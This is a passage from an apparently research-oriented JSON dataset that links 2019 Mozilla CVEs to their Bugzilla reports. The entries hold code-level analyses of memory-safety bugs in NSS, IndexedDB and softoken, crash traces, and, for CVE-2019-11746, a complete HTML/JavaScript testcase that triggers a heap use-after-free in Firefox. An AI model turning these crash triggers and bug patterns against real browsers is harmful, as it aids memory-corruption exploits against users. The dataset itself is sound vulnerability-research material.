case, the subtraction will wrap around and give a very large positive value for maxout due to its unsigned type. The subsequent use of maxout here: /* do it: NOTE: this assumes buf size in is >= buf size out! */ rv = (*context->update)(context->cipherInfo, pEncryptedPart, &outlen, maxout, pPart, ulPartLen); will allow context->update to write up to maxout many bytes, that is, effectively arbitrarily many bytes to pEncryptedPart. This is an out-of-bounds write arbitrarily far beyond the buffer. I think the first call to context->update should pass maxout rather than context->blockSize as the fourth parameter, so that the maximum output length is maxout rather than context->blockSize. I.e., rv = (*context->update)(context->cipherInfo, pEncryptedPart, - &padoutlen, context->blockSize, context->padBuf, + &padoutlen, maxout, context->padBuf, context->blockSize); The related function NSC_DecryptUpdate already does this: it uses maxout for the maximum-output-length parameter to context->update every time it calls context->update."
      }
    ],
    "CVE-2019-11746": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1564449",
        "title": "heap-use-after-free in mozilla::dom::VideoDocument::CreateVideoElement",
        "description": "The following testcase crashes the latest ASAN build of Firefox 70.0a1 (BuildID=20190709034824). It requires a fuzzing build (--enable-fuzzing) and the pref user_pref(\"fuzzing.enabled\",true). I am using a Python2 webserver (python -m SimpleHTTPServer) to host the testcase. It requires the attached webm file in the same directory. It works most reliable when loaded in many tabs at the same time. crash.html: <script> var fun1_called=0,fun2_called=0; function spin() { var x=new XMLHttpRequest(); x.open(\"POST\",\"/post\",false); x.send(\"X\"); } function start() { o10=new AudioContext(); o15=window.open('test-encrypted-different-av-keys.webm','popup34'+Math.random(),'height=54,width=-5,centerscreen,outerWidth=12,status,scrollbars'); o19=window.document; window.top.setTimeout(fun0, 4); } function fun0() { o15.addEventListener('DOMSubtreeModified',fun1); } function fun1() { if(window.top.fun1_called++)return; spin(); o15.fun2=fun2;o15.eval(\"location.href='javascript:fun2(this,document,window)'\"); spin(); o123=o19.createElement('frameset'); try{o98.body=o123;}catch(e){} spin(); } function fun2(othis, doc, t, count) { if(window.top.fun2_called++)return; window.top.o98=doc; FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12771==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00009e8e0 at pc 0x7f7ffe67f8e7 bp 0x7ffd585903b0 sp 0x7ffd585903a8 READ of size 8 at 0x60d00009e8e0 thread T0 (Web Content) #0 0x7f7ffe67f8e6 in AppendChildTo /builds/worker/workspace/build/src/dom/base/nsINode.h:769:12 #1 0x7f7ffe67f8e6 in mozilla::dom::VideoDocument::CreateVideoElement() /builds/worker/workspace/build/src/dom/html/VideoDocument.cpp:135 #2 0x7f7ffe67ef69 in mozilla::dom::VideoDocument::StartLayout() /builds/worker/workspace/build/src/dom/html/VideoDocument.cpp:73:17 #3 0x7f7ffe64f46d in mozilla::dom::MediaDocumentStreamListener::OnStartRequest(nsIRequest*) /builds/worker/workspace/build/src/dom/html/MediaDocument.cpp:55:14 #4 0x7f7ff8ab986c in nsDocumentOpenInfo::OnStartRequest(nsIRequest*) /builds/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:311:34 #5 0x7f7ff6bbf891 in mozilla::net::HttpChannelChild::DoOnStartRequest(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:683:20 #6 0x7f7ff6bcc6fd in mozilla::net::HttpChannelChild::OnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, mozilla::net::ParentLoadInfoForwarderArgs const&, bool const&, bool const&, bool const&, unsigned long const&, int const&, unsigned int const&, nsTString<char> const&, nsTString<char> const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, unsigned int const&, nsTString<char> const&, long const&, bool const&, bool const&, bool const&, mozilla::net::ResourceTimingStruct const&, bool const&) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:608:3 #7 0x7f7ff6c97469 in mozilla::net::StartRequestEvent::Run() /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:427:13 #8 0x7f7ff6a3e886 in mozilla::net::ChannelEventQueue::RunOrEnqueue(mozilla::net::ChannelEvent*, bool) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/net/ChannelEventQueue.h:210:10 #9 0x7f7ff6bca7c3 in mozilla::net::HttpChannelChild::RecvOnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, mozilla::net::ParentLoadInfoForwarderArgs const&, bool const&, bool const&, bool const&, unsigned long const&, int const&, unsigned int const&, nsTString<char> const&, nsTString<char> const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, short const&, unsigned int const&, nsTString<char> const&, long const&, bool const&, bool const&, bool const&, mozilla::net::ResourceTimingStruct const&, bool const&) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:489:12 #10 0x7f7ff7904ebf in mozilla::net::PHttpChannelChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PHttpChannelChild.cpp:859:28 #11 0x7f7ff75dac19 in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:7197:32 #12 0x7f7ff72b3236 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2158:25 #13 0x7f7ff72ae13b in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2082:9 #14 0x7f7ff72b06f7 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1939:3 #15 0x7f7ff72b1487 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1970:13 #16 0x7f7ff5e698b5 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32 #17 0x7f7ff5eaa7fc in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1225:14 #18 0x7f7ff5eb2684 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #19 0x7f7ff72bc5f4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:110:5 #20 0x7f7ff7193afe in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #21 0x7f7ff7193afe in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #22 0x7f7ff7193afe in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #23 0x7f80008e24a3 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #24 0x7f8004f5f10e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20 #25 0x7f7ff7193afe in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #26 0x7f7ff7193afe in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #27 0x7f7ff7193afe in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #28 0x7f8004f5dc51 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:754:34 #29 0x55bf9ba64113 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #30 0x55bf9ba64113 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:267 #31 0x7f801af30b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #32 0x55bf9b98564c in _start (/home/nils/browser/firefox/firefox/firefox+0x4564c) 0x60d00009e8e0 is located 0 bytes inside of 136-byte region [0x60d00009e8e0,0x60d00009e968) freed by thread T0 (Web Content) here: #0 0x55bf9ba30ce2 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7f7ff5c97378 in MaybeKillObject /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2429:29 #2 0x7f7ff5c97378 in SnowWhiteKiller::Visit(nsPurpleBuffer&, nsPurpleBufferEntry*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2459 #3 0x7f7ff5c6afb3 in void nsPurpleBuffer::VisitEntries<SnowWhiteKiller>(SnowWhiteKiller&) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:956:27 #4 0x7f7ff5c6c6d8 in nsCycleCollector::FreeSnowWhiteWithBudget(js::SliceBudget&) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2624:14 #5 0x7f7ff83f525c in AsyncFreeSnowWhite::Run() /builds/worker/workspace/build/src/js/xpconnect/src/XPCJSRuntime.cpp:146:9 #6 0x7f7ff5ecdf62 in IdleRunnableWrapper::Run() /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:331:22 #7 0x7f7ff5eaa7fc in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1225:14 #8 0x7f7ff5eb2684 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #9 0x7f80003af2e3 in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2909:31)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:348:25 #10 0x7f80003af2e3 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::BodyExtractorBase const*, bool) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2909 #11 0x7f80003acf5a in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, mozilla::dom::Nullable<mozilla::dom::DocumentOrBlobOrArrayBufferViewOrArrayBufferOrFormDataOrURLSearchParamsOrUSVString> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2727:11 #12 0x7f7ffcac17cd in mozilla::dom::XMLHttpRequest_Binding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:1346:24 #13 0x7f7ffd8fc222 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3181:13 #14 0x7f800523e8a7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448:13 #15 0x7f800523e8a7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:540 #16 0x7f800521ee80 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:599:10 #17 0x7f800521ee80 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3088 #18 0x7f80052085e8 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:425:10 #19 0x7f800523f3af in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:568:13 #20 0x7f80052415d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:611:8 #21 0x7f8005faa7cf in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #22 0x7f8005f66d11 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:237:19 #23 0x7f8005f89c8d in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:504:19 #24 0x7f800523fa75 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:514:14 #25 0x7f80052415d2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:611:8 #26 0x7f8005ed3cc8 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2658:10 #27 0x7f7ffced92fe in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:52:8 #28 0x7f7ffe197924 in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #29 0x7f7ffe197924 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1024 #30 0x7f7ffe199847 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1222:17 #31 0x7f7ffe17a161 in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:353:5 #32 0x7f7ffe17a161 in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:349 #33 0x7f7ffe178875 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:587:14 #34 0x7f7ffe17f104 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1047:11 #35 0x7f7ffe186e4b in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp previously allocated by thread T0 (Web Content) here: #0 0x55bf9ba31063 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x55bf9ba65dcd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:52:15 #2 0x7f7ffe42be4b in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/cxxalloc.h:33:10 #3 0x7f7ffe42be4b in NS_NewHTMLBodyElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLBodyElement.cpp:24 #4 0x7f7ffe660643 in mozilla::dom::MediaDocument::CreateSyntheticDocument() /builds/worker/workspace/build/src/dom/html/MediaDocument.cpp:235:39 #5 0x7f7ffe67fa3a in mozilla::dom::VideoDocument::SetScriptGlobalObject(nsIScriptGlobalObject*) /builds/worker/workspace/build/src/dom/html/VideoDocument.cpp:89:30 #6 0x7f7ffa148eac in nsGlobalWindowOuter::SetNewDocument(mozilla::dom::Document*, nsISupports*, bool) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:2169:14 #7 0x7f8001190c8a in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:967:22 #8 0x7f800118fc0c in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:718:10 #9 0x7f8004044f60 in nsDocShell::SetupNewViewer(nsIContentViewer*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8551:7 #10 0x7f8004043b51 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6387:17 #11 0x7f8003fcb7c4 in nsDocShell::CreateContentViewer(nsTSubstring<char> const&, nsIRequest*, nsIStreamListener**) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8354:3 #12 0x7f8003fc84aa in nsDSURIContentListener::DoContent(nsTSubstring<char> const&, bool, nsIRequest*, nsIStreamListener**, bool*) /builds/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:183:20 #13 0x7f7ff8abe983 in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /builds/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:748:18 #14 0x7f7ff8abafb4 in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:420:30 #15 0x7f7ff8ab9666 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*) /builds/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:299:8 #16 0x7f7ff6bbf891 in mozilla::net::HttpChannelChild::DoOnStartRequest(nsIRequest*, nsISupports*) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:683:20 #17 0x7f7ff6bcc6fd in mozilla::net::HttpChannelChild::OnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, mozilla::net::ParentLoadInfoForwarderArgs const&, bool const&, bool const&, bool const&, unsigned long const&, int const&, unsigned int const&, nsTString<char> const&, nsTString<char> const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, unsigned int const&, nsTString<char> const&, long const&, bool const&, bool const&, bool const&, mozilla::net::ResourceTimingStruct const&, bool const&) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:608:3 #18 0x7f7ff6c97469 in mozilla::net::StartRequestEvent::Run() /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:427:13 #19 0x7f7ff6a3e886 in mozilla::net::ChannelEventQueue::RunOrEnqueue(mozilla::net::ChannelEvent*, bool) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/net/ChannelEventQueue.h:210:10 #20 0x7f7ff6bca7c3 in mozilla::net::HttpChannelChild::RecvOnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, mozilla::net::ParentLoadInfoForwarderArgs const&, bool const&, bool const&, bool const&, unsigned long const&, int const&, unsigned int const&, nsTString<char> const&, nsTString<char> const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, short const&, unsigned int const&, nsTString<char> const&, long const&, bool const&, bool const&, bool const&, mozilla::net::ResourceTimingStruct const&, bool const&) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:489:12 #21 0x7f7ff7904ebf in mozilla::net::PHttpChannelChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PHttpChannelChild.cpp:859:28 #22 0x7f7ff75dac19 in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:7197:32 #23 0x7f7ff72b3236 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2158:25 #24 0x7f7ff72ae13b in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2082:9 #25 0x7f7ff72b06f7 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1939:3 #26 0x7f7ff72b1487 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1970:13 #27 0x7f7ff5e698b5 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32 #28 0x7f7ff5eaa7fc in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1225:14 #29 0x7f7ff5eb2684 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #30 0x7f7ff72bc5f4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:110:5 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsINode.h:769:12 in AppendChildTo Shadow bytes around the buggy address: 0x0c1a8000bcc0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 0x0c1a8000bcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1a8000bce0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1a8000bcf0: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa 0x0c1a8000bd00: fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1a8000bd10: 00 00 00 fa fa fa fa fa fa fa fa fa[fd]fd fd fd 0x0c1a8000bd20: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a8000bd30: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd 0x0c1a8000bd40: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c1a8000bd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a8000bd60: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==12771==ABORTING"
      }
    ],
    "CVE-2019-11752": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1501152",
        "title": "Use after free in KeyPath::ExtractKey",
        "description": "nsresult KeyPath::ExtractKey(JSContext* aCx, const JS::Value& aValue, Key& aKey) const { uint32_t len = mStrings.Length(); JS::Rooted<JS::Value> value(aCx); aKey.Unset(); for (uint32_t i = 0; i < len; ++i) { nsresult rv = GetJSValFromKeyPathString(aCx, aValue, mStrings[i], value.address(), DoNotCreateProperties, nullptr, nullptr); if (NS_FAILED(rv)) { return rv; } if (NS_FAILED(aKey.AppendItem(aCx, IsArray() && i == 0, value))) { // aKey.AppendItem can execute js getter (AppendItem => EncodeJSVal => EncodeJSValInternal => JS_GetElement) NS_ASSERTION(aKey.IsUnset(), \"Encoding error should unset\"); return NS_ERROR_DOM_INDEXEDDB_DATA_ERR; } } aKey.FinishArray(); return NS_OK; } aKey.AppendItem can execute js getter, call deleteIndex in the getter will cause UAF."
      }
    ],
    "CVE-2019-11756": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1508776",
        "title": "UAF in sftk_FreeSession due to improper refcounting",
        "description": "This bug was filed from the Socorro interface and is report bp-ec6e8cfb-9c0b-4e68-9917-977e80181120. ============================================================= Seen while looking at nightly crash stats. 1 crash so far, but there are several other similar signatures in the same build ID: 20181120100045. Some of the crash reports have safebrowing stuff in the stack. *https://crash-stats.mozilla.com/report/index/5e48d3a0-ac12-4463-84ee-fb62f0181120 - [@ sftk_ObjectFromHandle] * https://crash-stats.mozilla.com/report/index/aa4a675d-1dae-4b22-9698-355130181120 - [@ sftk_SessionFromHandle ] * https://crash-stats.mozilla.com/report/index/18de7f1b-8ec5-4fc1-8784-42ac90181120 * https://crash-stats.mozilla.com/report/index/7b929956-332a-4de6-8f53-6c5100181120 Possible regression range based on Build ID: https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=e44bb5b4bc79be613d29b3f95d7b508e68e3d128&tochange=eeddcefcdad847bf8a5737153079e9619ee5aa66 Top 10 frames of crashing thread: 0 @0x1cdb1e67a80 1 softokn3.dll sftk_FreeSession security/nss/lib/softoken/pkcs11u.c:1868 2 softokn3.dll NSC_DigestUpdate security/nss/lib/softoken/pkcs11c.c:1794 3 nss3.dll PK11_DigestOp security/nss/lib/pk11wrap/pk11cxt.c:783 4 xul.dll nsCryptoHash::Update security/manager/ssl/nsCryptoHash.cpp:116 5 xul.dll nsresult mozilla::safebrowsing::LookupCacheV4::VerifyChecksum toolkit/components/url-classifier/LookupCacheV4.cpp:416 6 xul.dll mozilla::safebrowsing::LookupCacheV4::LoadFromFile toolkit/components/url-classifier/LookupCacheV4.cpp:205 7 xul.dll nsresult mozilla::safebrowsing::LookupCache::LoadPrefixSet toolkit/components/url-classifier/LookupCache.cpp:478 8 xul.dll mozilla::safebrowsing::LookupCache::Open toolkit/components/url-classifier/LookupCache.cpp:83 9 xul.dll class RefPtr<mozilla::safebrowsing::LookupCache> mozilla::safebrowsing::Classifier::GetLookupCache toolkit/components/url-classifier/Classifier.cpp:1526 ============================================================="
      }
    ],
    "CVE-2019-11757": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1577107",
        "title": "Use After Free in IndexedDB",
        "description": "void IDBObjectStore::AppendIndexUpdateInfo( int64_t aIndexID, const KeyPath& aKeyPath, bool aUnique, bool aMultiEntry, const nsCString& aLocale, JSContext* aCx, JS::Handle<JS::Value> aVal, nsTArray<IndexUpdateInfo>& aUpdateInfoArray, ErrorResult& aRv) { const bool localeAware = !aLocale.IsEmpty(); if (!aMultiEntry) { ... return; } JS::Rooted<JS::Value> val(aCx); if (NS_FAILED(aKeyPath.ExtractKeyAsJSVal(aCx, aVal, val.address()))) { return; } bool isArray; if (!JS_IsArrayObject(aCx, val, &isArray)) { IDB_REPORT_INTERNAL_ERR(); aRv.Throw(NS_ERROR_DOM_INDEXEDDB_UNKNOWN_ERR); return; } if (isArray) { JS::Rooted<JSObject*> array(aCx, &val.toObject()); uint32_t arrayLength; if (NS_WARN_IF(!JS_GetArrayLength(aCx, array, &arrayLength))) { IDB_REPORT_INTERNAL_ERR(); aRv.Throw(NS_ERROR_DOM_INDEXEDDB_UNKNOWN_ERR); return; } for (uint32_t arrayIndex = 0; arrayIndex < arrayLength; arrayIndex++) { JS::Rooted<JS::Value> arrayItem(aCx); if (NS_WARN_IF(!JS_GetElement(aCx, array, arrayIndex, &arrayItem))) { // JS_GetElement can trigger js getter, call deleteIndex here will free `aLocale`. IDB_REPORT_INTERNAL_ERR(); aRv.Throw(NS_ERROR_DOM_INDEXEDDB_UNKNOWN_ERR); return; } Key value; auto result = value.SetFromJSVal(aCx, arrayItem, aRv); if (!result.Is(Ok, aRv) || value.IsUnset()) { // Not a value we can do anything with, ignore it. aRv.SuppressException(); continue; } IndexUpdateInfo* updateInfo = aUpdateInfoArray.AppendElement(); updateInfo->indexId() = aIndexID; updateInfo->value() = value; if (localeAware) { auto result = value.ToLocaleBasedKey(updateInfo->localizedValue(), aLocale, aRv);// UAF occurs! if (NS_WARN_IF(!result.Is(Ok, aRv))) { if (result.Is(Invalid, aRv)) { aRv.Throw(NS_ERROR_DOM_INDEXEDDB_UNKNOWN_ERR); } return; } } } } else { ... } }"
      }
    ],
    "CVE-2019-11758": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1536227",
        "title": "Crash in [@ nsTArray_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]",
